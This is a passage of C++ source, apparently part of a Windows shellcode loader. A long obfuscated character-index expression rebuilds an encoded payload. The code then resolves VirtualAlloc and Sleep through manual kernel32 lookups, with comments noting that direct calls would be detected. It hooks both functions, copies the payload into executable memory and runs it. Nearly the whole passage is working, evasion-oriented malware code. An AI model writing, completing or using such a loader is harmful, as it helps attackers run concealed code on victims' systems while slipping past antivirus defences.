str_orign[30] + str_orign[33] + str_orign[30] + str_orign[2] + str_orign[35] + str_orign[35] + str_orign[5] + str_orign[33] + str_orign[30] + str_orign[34] + str_orign[3] + str_orign[35] + str_orign[26] + str_orign[35] + str_orign[35] + str_orign[35] + str_orign[35] + str_orign[29] + str_orign[33] + str_orign[5] + str_orign[5] + str_orign[2] + str_orign[5] + str_orign[35] + str_orign[5] + str_orign[33] + str_orign[29] + str_orign[33] + str_orign[2] + str_orign[35] + str_orign[26] + str_orign[35] + str_orign[35] + str_orign[35] + str_orign[35] + str_orign[4] + str_orign[1] + str_orign[3] + str_orign[28] + str_orign[4] + str_orign[34] + str_orign[4] + str_orign[29] + str_orign[35] + str_orign[26] + str_orign[35] + str_orign[35] + str_orign[35] + str_orign[35] + str_orign[4] + str_orign[33] + str_orign[0] + str_orign[27] + str_orign[5] + str_orign[5] + str_orign[5] + str_orign[5] + str_orign[5] + str_orign[5] + str_orign[27] + str_orign[5] + str_orign[31] + str_orign[0] + str_orign[32] + str_orign[26] + str_orign[32] + str_orign[30] + str_orign[31] + str_orign[30] + str_orign[32] + str_orign[27] + str_orign[32] + str_orign[34] + str_orign[27] + str_orign[3] + str_orign[28] + str_orign[28] + str_orign[27] + str_orign[4] + str_orign[28] + str_orign[28] + str_orign[27] + str_orign[4] + str_orign[28] + str_orign[27] + str_orign[27] + str_orign[4] + str_orign[32] + str_orign[28] + str_orign[31] + str_orign[2] + str_orign[31] + str_orign[34] + str_orign[31] + str_orign[3] + str_orign[27] + str_orign[4] + str_orign[31] + str_orign[3] + str_orign[31] + str_orign[34] + str_orign[31] + str_orign[4] + str_orign[27] + str_orign[4] + str_orign[31] + str_orign[0] + str_orign[32] + str_orign[28] + str_orign[35] + str_orign[35] + str_orign[33] + str_orign[32] + str_orign[3] + str_orign[33] + str_orign[4] + str_orign[5] + str_orign[35] + str_orign[27] + str_orign[5] + str_orign[30] + str_orign[4] + str_orign[27] + str_orign[29] + str_orign[1] + str_orign[2] + str_orign[0] + str_orign[27] + str_orign[1] + str_orign[32] + str_orign[30] + str_orign[32] + str_orign[1] + str_orign[34] + str_orign[30] + str_orign[0] + str_orign[3] + str_orign[28] + str_orign[33] + str_orign[30] + str_orign[4] + str_orign[29] + str_orign[2] + str_orign[1] + str_orign[26] + str_orign[28] + str_orign[0] + str_orign[35] + str_orign[0] + str_orign[32] + str_orign[33] + str_orign[3] + str_orign[1] + str_orign[27] + str_orign[26] + str_orign[30] + str_orign[31] + str_orign[35] + str_orign[5] + str_orign[30] + str_orign[31] + str_orign[34] + str_orign[4] + str_orign[5] + str_orign[31] + str_orign[32] + str_orign[4] + str_orign[5] + str_orign[4] + str_orign[35] + str_orign[27] + str_orign[1] + str_orign[34] + str_orign[0] + str_orign[30] + str_orign[29] + str_orign[28] + str_orign[1] + str_orign[34] + str_orign[30] + str_orign[30] + str_orign[31] + str_orign[28] + str_orign[5] + str_orign[26] + str_orign[31] + str_orign[4] + str_orign[35] + str_orign[31] + str_orign[31] + str_orign[35] + str_orign[2] + str_orign[2] + str_orign[27] + str_orign[30] + str_orign[27] + str_orign[31] + str_orign[33] + str_orign[28] + str_orign[2] + str_orign[33] + str_orign[27] + str_orign[31] + str_orign[1] + str_orign[33] + str_orign[34] + str_orign[4] + str_orign[3] + str_orign[30] + str_orign[4] + str_orign[32] + str_orign[2] + str_orign[5] + str_orign[28] + str_orign[29] + str_orign[5] + str_orign[35] + str_orign[35] + str_orign[35] + str_orign[29] + str_orign[26] + str_orign[31] + str_orign[28] + str_orign[31] + str_orign[28] + str_orign[31] + str_orign[30] + str_orign[32] + str_orign[35] + str_orign[32] + str_orign[29] + str_orign[28] + str_orign[0] + str_orign[27] + str_orign[35] + str_orign[32] + str_orign[29] + str_orign[31] + str_orign[30] + str_orign[32] + str_orign[33] + str_orign[32] + str_orign[29] + str_orign[27] + str_orign[5] + str_orign[31] + str_orign[33] + str_orign[32] + str_orign[29] + str_orign[31] + str_orign[3] + str_orign[31] + str_orign[2] + str_orign[27] + str_orign[2] + str_orign[31] + str_orign[26] + str_orign[32] + str_orign[35] + str_orign[32] + str_orign[35] + str_orign[31] + str_orign[2] + str_orign[31] + str_orign[34] + str_orign[31] + str_orign[28] + str_orign[31] + str_orign[26] + str_orign[32] + str_orign[29] + str_orign[31] + str_orign[34] + str_orign[31] + str_orign[5] + str_orign[31] + str_orign[4] + str_orign[27] + str_orign[5] + str_orign[32] + str_orign[33] + str_orign[31] + str_orign[33] + str_orign[32] + str_orign[29] + str_orign[31] + str_orign[3] + str_orign[31] + str_orign[2] + str_orign[27] + str_orign[1] + str_orign[32] + str_orign[33] + str_orign[31] + str_orign[3] + str_orign[31] + str_orign[2] + str_orign[27] + str_orign[2] + str_orign[31] + str_orign[26] + str_orign[32] + str_orign[35] + str_orign[32] + str_orign[35] + str_orign[31] + str_orign[2] + str_orign[31] + str_orign[34] + str_orign[31] + str_orign[28] + str_orign[31] + str_orign[26] + str_orign[32] + str_orign[29] + str_orign[31] + str_orign[34] + str_orign[31] + str_orign[5] + str_orign[31] + str_orign[4] + str_orign[27] + str_orign[5] + str_orign[32] + str_orign[33] + str_orign[31] + str_orign[3] + str_orign[31] + str_orign[2] + str_orign[28] + str_orign[1] + str_orign[32] + str_orign[26] + str_orign[28] + str_orign[3] + str_orign[28] + str_orign[35] + str_orign[27] + str_orign[4] + str_orign[28] + str_orign[34] + str_orign[27] + str_orign[2] + str_orign[27] + str_orign[0] + str_orign[27] + str_orign[5] + str_orign[27] + str_orign[0] + str_orign[28] + str_orign[1] + str_orign[32] + str_orign[26] + str_orign[28] + str_orign[3] + str_orign[28] + str_orign[35] + str_orign[27] + str_orign[4] + str_orign[28] + str_orign[33] + str_orign[35] + str_orign[3] + str_orign[35] + str_orign[0] + str_orign[29] + str_orign[26] + str_orign[31] + str_orign[28] + str_orign[31] + str_orign[28] + str_orign[31] + str_orign[30] + str_orign[32] + str_orign[35] + str_orign[32] + str_orign[29] + str_orign[27] + str_orign[3] + str_orign[29] + str_orign[2] + str_orign[31] + str_orign[26] + str_orign[31] + str_orign[4] + str_orign[31] + str_orign[32] + str_orign[32] + str_orign[30] + str_orign[31] + str_orign[26] + str_orign[31] + str_orign[32] + str_orign[31] + str_orign[30] + str_orign[28] + str_orign[0] + str_orign[27] + str_orign[35] + str_orign[31] + str_orign[30] + str_orign[31] + str_orign[4] + str_orign[27] + str_orign[3] + str_orign[30] + str_orign[30] + str_orign[30] + str_orign[28] + str_orign[27] + str_orign[2] + str_orign[31] + str_orign[30] + str_orign[31] + str_orign[4] + str_orign[28] + str_orign[1] + str_orign[32] + str_orign[26] + str_orign[28] + str_orign[3] + str_orign[28] + str_orign[35] + str_orign[27] + str_orign[4] + str_orign[28] + str_orign[30] + str_orign[35] + str_orign[3] + str_orign[35] + str_orign[0] + str_orign[30] + str_orign[27] + str_orign[31] + str_orign[30] + str_orign[31] + str_orign[31] + str_orign[31] + str_orign[30] + str_orign[32] + str_orign[27] + str_orign[31] + str_orign[30] + str_orign[32] + str_orign[27] + str_orign[28] + str_orign[0] + str_orign[27] + str_orign[35] + str_orign[31] + str_orign[33] + str_orign[32] + str_orign[29] + str_orign[32] + str_orign[29] + str_orign[32] + str_orign[35] + str_orign[28] + str_orign[0] + str_orign[27] + str_orign[5] + str_orign[27] + str_orign[5] + str_orign[31] + str_orign[28] + str_orign[31] + str_orign[5] + str_orign[31] + str_orign[29] + str_orign[31] + str_orign[30] + str_orign[27] + str_orign[4] + str_orign[31] + str_orign[0] + str_orign[32] + str_orign[26] + str_orign[32] + str_orign[30] + str_orign[31] + str_orign[30] + str_orign[32] + str_orign[27] + str_orign[32] + str_orign[34] + str_orign[27] + str_orign[4] + str_orign[31] + str_orign[28] + str_orign[31] + str_orign[5] + str_orign[31] + str_orign[3] + str_orign[27] + str_orign[5] + str_orign[35] + str_orign[3] + str_orign[35] + str_orign[0] + str_orign[29] + str_orign[26] + str_orign[31] + str_orign[28] + str_orign[31] + str_orign[28] + str_orign[31] + str_orign[30] + str_orign[32] + str_orign[35] + str_orign[32] + str_orign[29] + str_orign[27] + str_orign[3] + str_orign[29] + str_orign[30] + str_orign[31] + str_orign[4] + str_orign[31] + str_orign[28] + str_orign[31] + str_orign[5] + str_orign[31] + str_orign[29] + str_orign[31] + str_orign[34] + str_orign[31] + str_orign[4] + str_orign[31] + str_orign[32] + str_orign[28] + str_orign[0] + str_orign[27] + str_orign[35] + str_orign[31] + str_orign[32] + str_orign[32] + str_orign[0] + str_orign[31] + str_orign[34] + str_orign[32] + str_orign[35] + str_orign[27] + str_orign[2] + str_orign[27] + str_orign[35] + str_orign[31] + str_orign[29] + str_orign[31] + str_orign[30] + str_orign[31] + str_orign[31] + str_orign[31] + str_orign[2] + str_orign[31] + str_orign[26] + str_orign[32] + str_orign[29] + str_orign[31] + str_orign[30] + str_orign[35] + str_orign[3] + str_orign[35] + str_orign[0] + str_orign[30] + str_orign[30] + str_orign[32] + str_orign[28] + str_orign[31] + str_orign[30] + str_orign[32] + str_orign[27] + str_orign[27] + str_orign[3] + str_orign[29] + str_orign[26] + str_orign[31] + str_orign[32] + str_orign[31] + str_orign[30] + str_orign[31] + str_orign[4] + str_orign[32] + str_orign[29] + str_orign[28] + str_orign[0] + str_orign[27] + str_orign[35] + str_orign[29] + str_orign[3] + str_orign[31] + str_orign[5] + str_orign[32] + str_orign[0] + str_orign[31] + str_orign[34] + str_orign[31] + str_orign[2] + str_orign[31] + str_orign[2] + str_orign[31] + str_orign[26] + str_orign[27] + str_orign[5] + str_orign[28] + str_orign[30] + str_orign[27] + str_orign[4] + str_orign[28] + str_orign[35] + str_orign[27] + str_orign[35] + str_orign[27] + str_orign[33] + str_orign[30] + str_orign[32] + str_orign[31] + str_orign[34] + str_orign[31] + str_orign[4] + str_orign[31] + str_orign[29] + str_orign[31] + str_orign[5] + str_orign[32] + str_orign[32] + str_orign[32] + str_orign[28] + str_orign[27] + str_orign[35] + str_orign[29] + str_orign[4] + str_orign[30] + str_orign[29] + str_orign[27] + str_orign[35] + str_orign[28] + str_orign[31] + str_orign[27] + str_orign[4] + str_orign[28] + str_orign[28] + str_orign[28] + str_orign[1] + str_orign[27] + str_orign[35] + str_orign[30] + str_orign[29] + str_orign[32] + str_orign[27] + str_orign[31] + str_orign[34] + str_orign[31] + str_orign[29] + str_orign[31] + str_orign[30] + str_orign[31] + str_orign[4] + str_orign[32] + str_orign[29] + str_orign[27] + str_orign[5] + str_orign[28] + str_orign[32] + str_orign[27] + str_orign[4] + str_orign[28] + str_orign[35] + str_orign[28] + str_orign[1] + str_orign[27] + str_orign[35] + str_orign[32] + str_orign[27] + str_orign[32] + str_orign[31] + str_orign[28] + str_orign[0] + str_orign[28] + str_orign[26] + str_orign[28] + str_orign[26] + str_orign[27] + str_orign[4] + str_orign[28] + str_orign[35] + str_orign[27] + str_orign[34] + str_orign[27] + str_orign[35] + str_orign[31] + str_orign[2] + str_orign[31] + str_orign[34] + str_orign[31] + str_orign[1] + str_orign[31] + str_orign[30] + str_orign[27] + str_orign[35] + str_orign[29] + str_orign[32] + str_orign[31] + str_orign[30] + str_orign[31] + str_orign[28] + str_orign[31] + str_orign[1] + str_orign[31] + str_orign[5] + str_orign[35] + str_orign[3] + str_orign[35] + str_orign[0] + str_orign[35] + str_orign[35] + str_orign[29] + str_orign[30] + str_orign[5] + str_orign[2] + str_orign[32] + str_orign[26] + str_orign[32] + str_orign[28] + str_orign[3] + str_orign[2] + str_orign[31] + str_orign[5] + str_orign[32] + str_orign[34] + str_orign[30] + str_orign[1] + str_orign[33] + str_orign[30] + str_orign[26] + str_orign[4] + str_orign[30] + str_orign[27] + str_orign[34] + str_orign[30] + str_orign[4] + str_orign[34] + str_orign[27] + str_orign[1] + str_orign[0] + str_orign[30] + str_orign[3] + str_orign[29] + str_orign[31] + str_orign[35] + str_orign[31] + str_orign[31] + str_orign[3] + str_orign[5] + str_orign[2] + str_orign[5] + str_orign[32] + str_orign[29] + str_orign[35] + str_orign[27] + str_orign[31] + str_orign[27] + str_orign[35] + str_orign[30] + str_orign[34] + str_orign[35] + str_orign[1] + str_orign[28] + str_orign[32] + str_orign[29] + str_orign[0] + str_orign[3] + str_orign[31] + str_orign[34] + str_orign[2] + str_orign[2] + str_orign[0] + str_orign[31] + str_orign[29] + str_orign[5] + str_orign[26] + str_orign[28] + str_orign[0] + str_orign[29] + str_orign[4] + str_orign[26] + str_orign[26] + str_orign[0] + str_orign[2] + str_orign[35] + str_orign[26] + str_orign[0] + str_orign[33] + str_orign[30] + str_orign[2] + str_orign[34] + str_orign[5] + str_orign[31] + str_orign[30] + str_orign[5] + str_orign[1] + str_orign[31] + str_orign[30] + str_orign[32] + str_orign[0] + str_orign[1] + str_orign[27] + str_orign[4] + str_orign[3] + str_orign[29] + str_orign[1] + str_orign[2] + str_orign[1] + str_orign[35] + str_orign[32] + str_orign[29] + str_orign[0] + str_orign[32] + str_orign[26] + str_orign[30] + str_orign[31] + str_orign[1] + str_orign[35] + str_orign[34] + str_orign[0] + str_orign[30] + str_orign[35] + str_orign[35] + str_orign[29] + str_orign[26] + str_orign[1] + str_orign[4] + str_orign[5] + str_orign[35] + str_orign[1] + str_orign[30] + str_orign[0] + str_orign[27] + str_orign[30] + str_orign[31] + str_orign[5] + str_orign[5] + str_orign[3] + str_orign[30] + str_orign[29] + str_orign[33] + str_orign[28] + str_orign[26] + str_orign[2] + str_orign[34] + str_orign[1] + str_orign[0] + str_orign[35] + str_orign[35] + str_orign[35] + str_orign[35] + str_orign[29] + str_orign[35] + str_orign[35] + str_orign[35] + str_orign[29] + str_orign[26] + str_orign[1] + str_orign[33] + str_orign[35] + str_orign[35] + str_orign[26] + str_orign[35] + str_orign[35] + str_orign[35] + str_orign[35] + str_orign[35] + str_orign[29] + str_orign[26] + str_orign[1] + str_orign[34] + str_orign[29] + str_orign[35] + str_orign[35] + str_orign[35] + str_orign[35] + str_orign[35] + str_orign[35] + str_orign[35] + str_orign[29] + str_orign[26] + str_orign[1] + str_orign[0] + str_orign[30] + str_orign[33] + str_orign[0] + str_orign[29] + str_orign[30] + str_orign[28] + str_orign[4] + str_orign[30] + str_orign[5] + str_orign[5] + str_orign[3] + str_orign[30] + str_orign[29] + str_orign[33] + str_orign[34] + str_orign[28] + str_orign[30] + str_orign[28] + str_orign[30] + str_orign[28] + str_orign[29] + str_orign[33] + str_orign[33] + str_orign[34] + str_orign[4] + str_orign[32] + str_orign[29] + str_orign[33] + str_orign[33] + str_orign[34] + str_orign[5] + str_orign[26] + str_orign[29] + str_orign[33] + str_orign[33] + str_orign[34] + str_orign[3] + str_orign[0] + str_orign[29] + str_orign[26] + str_orign[1] + str_orign[33] + str_orign[35] + str_orign[35] + str_orign[27] + str_orign[35] + str_orign[35] + str_orign[35] + str_orign[35] + str_orign[35] + str_orign[29] + str_orign[34] + str_orign[33] + str_orign[34] + str_orign[5] + str_orign[34] + str_orign[29] + str_orign[26] + str_orign[1] + str_orign[0] + str_orign[26] + str_orign[27] + str_orign[34] + str_orign[31] + str_orign[33] + str_orign[34] + str_orign[4] + str_orign[27] + str_orign[5] + str_orign[5] + str_orign[3] + str_orign[30] + str_orign[29] + str_orign[33] + str_orign[33] + str_orign[28] + str_orign[2] + str_orign[29] + str_orign[27] + str_orign[35] + str_orign[33] + str_orign[30] + str_orign[2] + str_orign[35] + str_orign[32] + str_orign[29] + str_orign[1] + str_orign[31] + str_orign[31] + str_orign[31] + str_orign[33] + str_orign[1] + str_orign[35] + str_orign[32] + str_orign[29] + str_orign[33] + str_orign[35] + str_orign[26] + str_orign[2] + str_orign[28] + str_orign[33] + str_orign[30] + str_orign[2] + str_orign[35] + str_orign[32] + str_orign[30] + str_orign[3] + str_orign[32] + str_orign[30] + str_orign[33] + str_orign[30] + str_orign[33] + str_orign[30] + str_orign[33] + str_orign[29] + str_orign[33] + str_orign[35] + str_orign[30] + str_orign[0] + str_orign[5] + str_orign[35] + str_orign[5] + str_orign[35] + str_orign[35] + str_orign[35] + str_orign[35] + str_orign[30] + str_orign[35] + str_orign[2] + str_orign[28] + str_orign[4] + str_orign[33] + str_orign[34] + str_orign[5] + str_orign[5] + str_orign[3] + str_orign[5] + str_orign[5] + str_orign[5] + str_orign[5] + str_orign[28] + str_orign[26] + str_orign[28] + str_orign[35] + str_orign[28] + str_orign[26] + str_orign[27] + str_orign[4] + str_orign[28] + str_orign[29] + str_orign[28] + str_orign[27] + str_orign[27] + str_orign[4] + str_orign[28] + str_orign[26] + str_orign[28] + str_orign[32] + str_orign[28] + str_orign[30] + str_orign[27] + str_orign[4] + str_orign[28] + str_orign[33] + str_orign[28] + str_orign[34] + str_orign[35] + str_orign[35] + str_orign[35] + str_orign[30] + str_orign[5] + str_orign[30] + str_orign[4] + str_orign[26] + str_orign[35] + str_orign[35];

        // cout << str.length() << std::endl;
         //cout << str << std::endl;
         //    unsigned char buf[798] = "";
         //    char nData = *(volatile unsigned char*)buf;
         //    for (int i = 0; i < (str.length()/2); i=i + 2) {
         //        nData = str[i];
         //
         //      
         ///*        cout << str << std::endl;
         //        cout << i << std::endl;
         //        cout << str.length()<< std::endl*/;
         //    }


             //TCHAR szVirAlloc[] = TEXT("VirtualAlloc");
            typedef LPVOID(WINAPI* VirtualAllocB)(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
            DWORD kernel32_address = _getKernelBase();
            DWORD process_address = _getProcessAddress(kernel32_address);
            
            //VirtualAllocB p = (VirtualAllocB)_getFunction(process_address);  //这里会识别
            //_getFunction(process_address, kernel32_address);
            //DWORD _getprocessaddress1 = _getProcessAddress(szVirAlloc);
            //_getFunction(_getProcessAddress())
            VirtualAllocB p = (VirtualAllocB)_getFunction_virtualalloc(process_address, kernel32_address);  //这里会识别
            typedef void(WINAPI* SleepB)(DWORD dwMilliseconds);
            SleepB sleepa = (SleepB)_getFunction_sleep(process_address, kernel32_address);
            printf("sleep address:%p\n", (LPVOID)sleepa);
            hookaddress_sleep = (LPVOID)sleepa;  //获取到sleep的地址
            HookSleep();
            //Sleep(10000);
            //printf("HookedVirtualAlloc is :%p\n", (DWORD_PTR)HookedVirtualAlloc);
            char* a = (char*)(*p)(NULL, str.length(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE); //get a memory to save shellcode
            printf("变量p的地址: %p\n", p);
            hookaddress_virutalallc = (LPVOID)p;   //获取到virtualalloc的地址
            HookVirtualAlloc();

            
            // hooked virtualalloc
            
            //printf("变量a的地址: %p\n", &a);
            //cout << str.length() << "aaaaaa" << std::endl;
            //cout << str.c_str() << std::endl;
            SetStrToMem(str, a);
            (*(void(*)())a)();
            //cout << "str1111" << std::endl;
            //cout << str << std::endl;

            return 0;
        
       // else {
            //cout << "nihao" << std::endl;
       //     return 0;
       // }
    
}

